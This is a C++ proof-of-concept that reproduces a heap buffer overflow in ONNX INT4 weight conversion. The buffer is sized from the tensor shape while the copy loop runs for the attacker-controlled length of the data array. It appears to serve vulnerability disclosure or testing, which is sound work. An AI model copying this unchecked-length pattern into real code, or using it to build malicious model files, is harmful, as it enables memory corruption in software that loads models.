#include <cstdint>
#include <cstddef>
#include <cstdio>
#include <memory>
#include <vector>
#include <stdexcept>
#include <limits>

namespace onnxproto {
constexpr int32_t INT4 = 22;
constexpr int32_t FLOAT4E2M1 = 23;
}

static int32_t getDtypeSizeBits(int32_t onnxDtype)
{
    switch (onnxDtype)
    {
    case onnxproto::INT4: return 4;
    case onnxproto::FLOAT4E2M1: return 4;
    default: return -1;
    }
}

static size_t getTensorOrWeightsSizeBytes(int64_t count, int32_t onnxDtype)
{
    int32_t dTypeSize = getDtypeSizeBits(onnxDtype);
    if (dTypeSize == -1
        || static_cast<size_t>(count) > std::numeric_limits<size_t>::max() / static_cast<size_t>(dTypeSize))
    {
        throw std::runtime_error("Size of weights exceeds maximum!");
    }
    int64_t sizeInBits = count * dTypeSize;
    if (sizeInBits % 8 != 0)
    {
        sizeInBits += 4;
    }
    return static_cast<size_t>(sizeInBits / 8);
}

struct ShapedWeights {
    void* values{nullptr};
    int64_t shapeCount{0};
    int32_t type{0};
    size_t size_bytes() const { return getTensorOrWeightsSizeBytes(shapeCount, type); }
};

static std::vector<std::unique_ptr<std::byte[]>> g_arena;

static ShapedWeights createTempWeights(int32_t onnxdtype, int64_t shapeCount)
{
    ShapedWeights w;
    w.type = onnxdtype;
    w.shapeCount = shapeCount;
    size_t n = w.size_bytes();
    auto buf = std::make_unique<std::byte[]>(n);
    w.values = buf.get();
    g_arena.push_back(std::move(buf));
    fprintf(stderr, "[poc] createTempWeights: dtype=%d shapeCount=%lld -> alloc %zu byte(s)\n",
            onnxdtype, (long long) shapeCount, n);
    return w;
}

static uint8_t* convertPackedInt32Data(int32_t const* weightValues, int64_t shapeCount, size_t nbytes, int32_t onnxdtype)
{
    uint8_t* newWeights{static_cast<uint8_t*>(createTempWeights(onnxdtype, shapeCount).values)};
    fprintf(stderr, "[poc] convertPackedInt32Data: writing nbytes=%zu into the buffer above\n", nbytes);
    for (size_t i = 0; i < nbytes; i++)
    {
        newWeights[i] = static_cast<uint8_t>(weightValues[i]);
    }
    return newWeights;
}

int main()
{
    int64_t const shapeCount = 2;
    int32_t const onnxDtype = onnxproto::INT4;
    // matches poc.onnx: helper.make_tensor(INT4, dims=[2], vals=[0]*4096) packs
    // two int4 nibbles per int32 -> int32_data().size() == 2048 on disk.
    size_t const attackerNbytes = 2048;

    std::vector<int32_t> int32_data(attackerNbytes, 0);

    fprintf(stderr, "[poc] onnx initializer: data_type=INT4(22) dims=[2] int32_data.size()=%zu\n", int32_data.size());
    fprintf(stderr, "[poc] buffer is sized from SHAPE (count=2 -> 1 byte); loop length is from DATA (%zu)\n", int32_data.size());

    convertPackedInt32Data(int32_data.data(), shapeCount, int32_data.size(), onnxDtype);

    fprintf(stderr, "[poc] returned WITHOUT crash -- unexpected (ASan should have fired)\n");
    return 0;
}
